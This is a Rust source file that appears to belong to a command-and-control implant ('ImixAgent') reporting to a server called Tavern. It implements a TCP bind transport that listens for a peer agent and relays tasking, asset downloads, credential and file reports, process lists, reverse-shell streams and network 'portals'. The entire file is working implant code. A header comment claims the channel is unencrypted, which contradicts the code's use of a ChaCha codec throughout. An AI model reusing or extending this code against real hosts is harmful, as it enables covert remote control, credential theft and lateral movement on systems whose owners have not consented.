use crate::Transport;
use anyhow::{anyhow, Result};
use pb::c2::*;
use pb::config::Config;
use std::sync::mpsc::{Receiver, Sender};
use std::sync::Arc;
use tokio::net::TcpListener;
use tokio_stream::wrappers::TcpListenerStream;
use tonic::GrpcMethod;
use tonic::Request;

// TCP Bind is a local trusted channel; use plain protobuf codec (no encryption).
// ChaCha encryption is applied by Agent A when forwarding upstream to Tavern.

static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";

/// Cached TCP listener + gRPC channel, keyed by bind address.
/// ImixAgent calls TcpBindTransport::new() every beacon cycle; caching here prevents
/// re-binding the port and re-creating the HTTP/2 connection each time.
static TCP_BIND_CACHE: std::sync::OnceLock<(
    String,                                         // bind addr
    Arc<tokio::sync::Mutex<TcpListenerStream>>,     // listener stream
    tonic::client::Grpc<tonic::transport::Channel>, // persistent gRPC channel
)> = std::sync::OnceLock::new();

#[derive(Clone)]
pub struct TcpBindTransport {
    grpc: Option<tonic::client::Grpc<tonic::transport::Channel>>,
}

#[async_trait::async_trait]
impl Transport for TcpBindTransport {
    fn clone_box(&self) -> Box<dyn Transport + Send + Sync> {
        Box::new(self.clone())
    }

    fn init() -> Self {
        TcpBindTransport { grpc: None }
    }

    fn new(config: Config) -> Result<Self> {
        let uri = config
            .info
            .as_ref()
            .and_then(|info| info.available_transports.as_ref())
            .and_then(|at| {
                let active_idx = at.active_index as usize;
                at.transports
                    .get(active_idx)
                    .or_else(|| at.transports.first())
            })
            .map(|t| t.uri.clone())
            .ok_or_else(|| anyhow!("No transports configured"))?;

        #[cfg(feature = "verbose-logging")]
        log::info!("[tcp-bind] new() with uri: {}", uri);

        // Expect URI to look like tcp://0.0.0.0:8443
        let addr = if uri.starts_with("tcp://") {
            uri.strip_prefix("tcp://")
                .unwrap()
                .trim_end_matches('/')
                .to_string()
        } else {
            return Err(anyhow!(
                "Invalid scheme for TCP Bind transport (expected tcp://): {}",
                uri
            ));
        };

        #[cfg(feature = "verbose-logging")]
        log::info!("[tcp-bind] bind address: {}", addr);

        // If we already have a cached channel for this addr, reuse it.
        if let Some((cached_addr, _stream, cached_grpc)) = TCP_BIND_CACHE.get() {
            if cached_addr == &addr {
                #[cfg(feature = "verbose-logging")]
                log::debug!("[tcp-bind] reusing cached gRPC channel for {}", addr);
                return Ok(Self {
                    grpc: Some(cached_grpc.clone()),
                });
            } else {
                return Err(anyhow!(
                    "TcpBindTransport addr changed from {} to {} — restart required",
                    cached_addr,
                    addr
                ));
            }
        }

        // First call: bind the listener using synchronous std API (safe to call outside async context).
        #[cfg(feature = "verbose-logging")]
        log::info!(
            "[tcp-bind] binding TCP listener at {} — waiting for Agent A to connect",
            addr
        );
        let std_listener = std::net::TcpListener::bind(&addr)?;
        std_listener.set_nonblocking(true)?;
        let listener = TcpListener::from_std(std_listener)?;
        let stream = Arc::new(tokio::sync::Mutex::new(TcpListenerStream::new(listener)));

        // We use a dummy endpoint since we are connecting over the custom connector.
        let endpoint = tonic::transport::Endpoint::try_from("http://[::]:50051")?;
        let stream_for_connector = stream.clone();
        let channel = endpoint.connect_with_connector_lazy(tower::service_fn(
            move |uri: tonic::transport::Uri| {
                let stream_clone = stream_for_connector.clone();
                #[cfg(feature = "verbose-logging")]
                log::debug!("[tcp-bind] connector called for uri: {}", uri);
                async move {
                    use tokio_stream::StreamExt;
                    #[cfg(feature = "verbose-logging")]
                    log::debug!("[tcp-bind] connector: waiting for next TCP connection...");
                    let mut guard = stream_clone.lock().await;
                    if let Some(conn) = guard.next().await {
                        match conn {
                            Ok(c) => {
                                #[cfg(feature = "verbose-logging")]
                                log::info!(
                                    "[tcp-bind] connector: accepted connection from Agent A"
                                );
                                Ok(hyper_util::rt::TokioIo::new(c))
                            }
                            Err(e) => {
                                #[cfg(feature = "verbose-logging")]
                                log::error!("[tcp-bind] connector: accept error: {}", e);
                                Err(std::io::Error::new(
                                    std::io::ErrorKind::Other,
                                    e.to_string(),
                                ))
                            }
                        }
                    } else {
                        #[cfg(feature = "verbose-logging")]
                        log::error!("[tcp-bind] connector: TCP listener stream closed");
                        Err(std::io::Error::new(
                            std::io::ErrorKind::BrokenPipe,
                            "TCP listener closed",
                        ))
                    }
                }
            },
        ));

        let grpc = tonic::client::Grpc::new(channel);
        #[cfg(feature = "verbose-logging")]
        log::info!("[tcp-bind] gRPC channel created, transport ready");

        // Cache the stream + channel for future cycles.
        let _ = TCP_BIND_CACHE.set((addr, stream, grpc.clone()));

        Ok(Self { grpc: Some(grpc) })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        #[cfg(feature = "verbose-logging")]
        log::debug!("[tcp-bind] claim_tasks()");
        let resp = self.claim_tasks_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        let resp = self.fetch_asset_impl(request).await?;
        let mut stream = resp.into_inner();
        loop {
            match stream.message().await {
                Ok(Some(msg)) => {
                    if tx.send(msg).is_err() {
                        break;
                    }
                }
                Ok(None) => break,
                Err(_) => break,
            }
        }
        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        let resp = self.report_credential_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        let stream = tokio_stream::iter(request);
        let tonic_req = Request::new(stream);
        let resp = self.report_file_impl(tonic_req).await?;
        Ok(resp.into_inner())
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        let resp = self.report_process_list_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_output(
        &mut self,
        request: ReportOutputRequest,
    ) -> Result<ReportOutputResponse> {
        #[cfg(feature = "verbose-logging")]
        log::debug!("[tcp-bind] report_output()");
        let resp = self.report_output_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);
        let resp = self.reverse_shell_impl(req_stream).await?;
        let mut resp_stream = resp.into_inner();

        tokio::spawn(async move {
            while let Some(msg) = match resp_stream.message().await {
                Ok(m) => m,
                Err(_) => None,
            } {
                if tx.send(msg).await.is_err() {
                    return;
                }
            }
        });

        Ok(())
    }

    async fn create_portal(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
    ) -> Result<()> {
        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);
        let resp = self.create_portal_impl(req_stream).await?;
        let mut resp_stream = resp.into_inner();

        tokio::spawn(async move {
            while let Some(msg) = match resp_stream.message().await {
                Ok(m) => m,
                Err(_) => None,
            } {
                if tx.send(msg).await.is_err() {
                    return;
                }
            }
        });

        Ok(())
    }

    fn get_type(&mut self) -> pb::c2::transport::Type {
        pb::c2::transport::Type::TransportTcpBind
    }

    fn is_active(&self) -> bool {
        self.grpc.is_some()
    }

    fn name(&self) -> &'static str {
        "tcp-bind"
    }

    async fn forward_raw(
        &mut self,
        _path: String,
        _rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
        _tx: tokio::sync::mpsc::Sender<Vec<u8>>,
    ) -> Result<()> {
        Err(anyhow!(
            "TCP Bind transport raw forwarding not implemented yet"
        ))
    }

    fn list_available(&self) -> Vec<String> {
        vec!["tcp-bind".to_string()]
    }
}

impl TcpBindTransport {
    async fn check_ready(&mut self) -> Result<(), tonic::Status> {
        if self.grpc.is_none() {
            #[cfg(feature = "verbose-logging")]
            log::error!("[tcp-bind] check_ready: grpc client is None");
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        #[cfg(feature = "verbose-logging")]
        log::debug!("[tcp-bind] check_ready: waiting for gRPC channel to be ready...");
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            #[cfg(feature = "verbose-logging")]
            log::error!("[tcp-bind] check_ready: channel not ready: {}", e);
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        #[cfg(feature = "verbose-logging")]
        log::debug!("[tcp-bind] check_ready: channel ready");
        Ok(())
    }

    pub async fn claim_tasks_impl(
        &mut self,
        request: impl tonic::IntoRequest<ClaimTasksRequest>,
    ) -> std::result::Result<tonic::Response<ClaimTasksResponse>, tonic::Status> {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(CLAIM_TASKS_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ClaimTasks"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    pub async fn fetch_asset_impl(
        &mut self,
        request: impl tonic::IntoRequest<FetchAssetRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<FetchAssetResponse>>,
        tonic::Status,
    > {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(FETCH_ASSET_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "FetchAsset"));
        self.grpc
            .as_mut()
            .unwrap()
            .server_streaming(req, path, codec)
            .await
    }

    pub async fn report_credential_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportCredentialRequest>,
    ) -> std::result::Result<tonic::Response<ReportCredentialResponse>, tonic::Status> {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_CREDENTIAL_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportCredential"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    pub async fn report_file_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReportFileRequest>,
    ) -> std::result::Result<tonic::Response<ReportFileResponse>, tonic::Status> {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_FILE_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportFile"));
        self.grpc
            .as_mut()
            .unwrap()
            .client_streaming(req, path, codec)
            .await
    }

    pub async fn report_process_list_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportProcessListRequest>,
    ) -> std::result::Result<tonic::Response<ReportProcessListResponse>, tonic::Status> {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportProcessList"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    pub async fn report_output_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportOutputRequest>,
    ) -> std::result::Result<tonic::Response<ReportOutputResponse>, tonic::Status> {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_OUTPUT_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportOutput"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    async fn reverse_shell_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReverseShellRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>,
        tonic::Status,
    > {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReverseShell"));
        self.grpc
            .as_mut()
            .unwrap()
            .streaming(req, path, codec)
            .await
    }

    async fn create_portal_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = CreatePortalRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<CreatePortalResponse>>,
        tonic::Status,
    > {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(CREATE_PORTAL_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "CreatePortal"));
        self.grpc
            .as_mut()
            .unwrap()
            .streaming(req, path, codec)
            .await
    }
}
